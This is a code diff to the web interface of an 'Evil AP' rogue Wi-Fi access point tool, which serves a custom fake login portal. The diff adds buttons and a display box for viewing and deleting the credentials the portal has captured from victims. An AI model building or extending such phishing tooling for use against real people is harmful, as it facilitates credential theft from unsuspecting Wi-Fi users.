@@ -633,7 +633,8 @@ function evilapView(){
      <button class="small" id="evilStopBtn" style="display:none" onclick="api('/api/evilap/stop',{method:'POST'})">Stop</button>
    </div></div>
   <div class="panel"><h2>Stats</h2><table><tr><td>Portal hits</td><td id="eHits">-</td></tr>
-   <tr><td>Credentials captured</td><td id="eCaps">-</td></tr></table></div>
+   <tr><td>Credentials captured</td><td id="eCaps">- <button class="small" onclick="showCreds()">View</button> <button class="small danger" onclick="clearCreds()">Clear</button></td></tr></table>
+   <pre id="credsBox" style="display:none;margin-top:8px;background:#0d0d16;padding:8px;border-radius:5px;max-height:240px;overflow:auto"></pre></div>
   <div class="panel"><h2>Custom Portal Page</h2>
    <p class="muted">Stored encrypted as /portal.html.enc on the SD card. Overrides any template.</p>
    <textarea id="evilHtml" rows="12" style="font-family:'Courier New',monospace" placeholder="<html>...custom login page..."></textarea>
@@ -650,6 +651,17 @@ async function refreshEvil(){
     $("#evilStartBtn").style.display=s.running?"none":"";
     $("#evilStopBtn").style.display=s.running?"":"none";
   }catch(e){}
+}
+async function showCreds(){
+  const t=await fetch("/api/evilap/creds").then(r=>r.text());
+  const box=$("#credsBox");
+  box.style.display="block";
+  box.textContent=t.trim()||"(nothing captured yet)";
+}
+async function clearCreds(){
+  if(!(await confirmModal("Delete all captured credentials?")))return;
+  await api("/api/file?path="+encodeURIComponent("/logs/creds.enc"),{method:"DELETE"});
+  showCreds(); toast("Captured credentials cleared");
 }
 async function evilStart(){
   const ssid=$("#evilSsid").value.trim(); if(!ssid)return toast("Enter an SSID","err");
